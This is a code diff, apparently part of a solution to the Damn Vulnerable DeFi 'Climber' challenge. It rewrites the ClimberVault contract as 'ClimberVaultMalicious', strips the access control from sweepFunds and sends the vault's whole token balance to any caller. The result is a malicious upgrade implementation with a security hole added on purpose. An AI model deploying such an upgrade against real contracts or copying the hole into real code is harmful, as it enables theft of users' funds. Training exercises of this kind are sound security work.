@@ -16,7 +16,11 @@ import {CallerNotSweeper, InvalidWithdrawalAmount, InvalidWithdrawalTime} from "
  * @dev To be deployed behind a proxy following the UUPS pattern. Upgrades are to be triggered by the owner.
  * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
  */
-contract ClimberVault is Initializable, OwnableUpgradeable, UUPSUpgradeable {
+contract ClimberVaultMalicious is
+    Initializable,
+    OwnableUpgradeable,
+    UUPSUpgradeable
+{
     uint256 private _lastWithdrawalTimestamp;
     address private _sweeper;
 
@@ -32,7 +36,6 @@ contract ClimberVault is Initializable, OwnableUpgradeable, UUPSUpgradeable {
         _disableInitializers();
     }
 
-    // @audit-ok notes: already initialised
     function initialize(
         address admin,
         address proposer,
@@ -42,6 +45,7 @@ contract ClimberVault is Initializable, OwnableUpgradeable, UUPSUpgradeable {
         __Ownable_init();
         __UUPSUpgradeable_init();
 
+        // Deploy timelock and transfer ownership to it
         transferOwnership(address(new ClimberTimelock(admin, proposer)));
 
         _setSweeper(sweeper);
@@ -67,11 +71,11 @@ contract ClimberVault is Initializable, OwnableUpgradeable, UUPSUpgradeable {
         SafeTransferLib.safeTransfer(token, recipient, amount);
     }
 
-    // Allows trusted sweeper account to retrieve any tokens
-    function sweepFunds(address token) external onlySweeper {
+    // NB: modified function by having the access control removed
+    function sweepFunds(address token) external {
         SafeTransferLib.safeTransfer(
             token,
-            _sweeper,
+            msg.sender,
             IERC20(token).balanceOf(address(this))
         );
     }
